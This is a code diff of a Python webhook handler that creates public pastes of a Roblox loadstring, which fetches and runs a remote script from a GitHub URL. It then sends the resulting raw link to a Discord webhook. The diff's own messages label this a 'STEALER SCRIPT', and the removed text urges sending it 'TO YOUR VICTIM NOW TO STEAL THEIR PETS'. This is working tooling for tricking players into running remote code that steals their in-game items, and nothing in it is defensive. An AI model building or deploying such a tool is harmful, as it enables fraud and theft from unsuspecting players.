@@ -1,6 +1,5 @@
 import requests
 import json
-import os
 
 def handler(request):
     if request.method != "POST":
@@ -17,30 +16,23 @@ def handler(request):
     if not username or not webhook:
         return {"statusCode": 400, "body": "Missing username or webhook"}
 
-    # Pastebin API key from Vercel env
-    PASTEBIN_API_KEY = os.environ.get("PASTEBIN_API_KEY")
-    if not PASTEBIN_API_KEY:
-        return {"statusCode": 500, "body": "Missing Pastebin API key"}
-
-    # Create paste
+    # Create paste in Pastefy
     paste_data = {
-        "api_dev_key": PASTEBIN_API_KEY,
-        "api_option": "paste",
-        "api_paste_code": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()',
-        "api_paste_private": "1",
-        "api_paste_name": f"{username}_script",
+        "title": f"{username}_script",
+        "content": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()',
+        "public": True
     }
 
-    paste_res = requests.post("https://pastebin.com/api/api_post.php", data=paste_data)
-    if "Bad API request" in paste_res.text:
-        return {"statusCode": 500, "body": "Pastebin Error: " + paste_res.text}
+    paste_res = requests.post("https://pastefy.app/api/v2/paste", json=paste_data)
+    if paste_res.status_code != 200:
+        return {"statusCode": 500, "body": "Pastefy Error: " + paste_res.text}
 
-    paste_link = paste_res.text
-    paste_raw = paste_link.replace("pastebin.com/", "pastebin.com/raw/")
+    paste_json = paste_res.json()
+    paste_raw = paste_json.get("rawUrl")
 
-    # Send Discord message
+    # Send message to user's webhook
     payload = {
-        "content": f"WORKING SEND THIS SCRIPT TO YOUR VICTIM NOW TO STEAL THEIR PETS\n\n```\nloadstring(game:HttpGet(\"{paste_raw}\"))()\n```"
+        "content": f"STEALER SCRIPT:\n\n```\nloadstring(game:HttpGet(\"{paste_raw}\"))()\n```"
     }
     requests.post(webhook, json=payload)
 
